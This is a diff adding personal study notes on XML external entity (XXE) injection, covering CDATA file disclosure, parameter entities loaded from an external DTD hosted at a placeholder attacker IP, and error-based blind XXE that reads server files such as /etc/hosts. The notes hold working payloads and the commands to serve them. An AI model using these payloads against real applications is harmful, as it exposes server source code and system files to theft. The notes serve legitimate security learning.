@@ -452,6 +452,64 @@ sudo python3 -m http.server 80
 > Note: The expect module is not enabled/installed by default on modern PHP servers.
 
 ## Advanced File Disclosure
+### Data Exfiltration with CDATA
+- We can use `CDATA` to extract any kind of data (even binnary files) from any web application.
+- We do this by wrapping the entity in the `CDATA` tag: `<![CDATA[ FILE_CONTENT ]]>`
+- Easier to define a begin and an end, like below
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+> Note: XML prevents joining internal and external entities, so this may not work  
+
+### XML Parameter identities
+- We can use parameter identities to get around the above referenced limitation.
+- `XML Parameter Identites` are special types of entities that start with a `%` and can only be used within the DTD.
+        - What's unique about parameter identites is that if we reference them from an external source, then all of them would be considered external.
+
+- Exploitation
+- We need to host the DTD on another server (Like our attack host)
+```bash
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python3 -m http.server 8000
+```
+- Now we can reference our external entity, and then print the `&joined;` entity we created.
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+
+### Error Based XXE
+We may find ourselves in a situation where the web app doesn't write any output, this would be `blind XXE`. In that case, if the webapp displays runtime errors, and doesn't have proper exception handling for the XML input, then we can use this read the output of our XXE exploit. It's very possible the webapp may do neither of these, in which case we are completely blind.
+
+- Basically, we are looking for the error message to display our XXE instead of it being output to the screen.
+- Simple enumeration is to delete a tag in the XML and see if it generates an error.
+- We can host the below DTD on our system and reference it from the server.
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+- The above code creates an entity `file` for the file we want to read (`<!ENTITY % file SYSTEM "file:///etc/hosts">`), and then we create a nonsense entity that tries to join with our file entity (`<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">), since the 2nd entity does not exist, it will throw an error, along with our file entity.
+- We can then that references our error entity hosted on our attack system.
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
 ## Blind Data Exfiltration
 # todo
 - [ ] Resume at XXE Injection Local File Disclosure
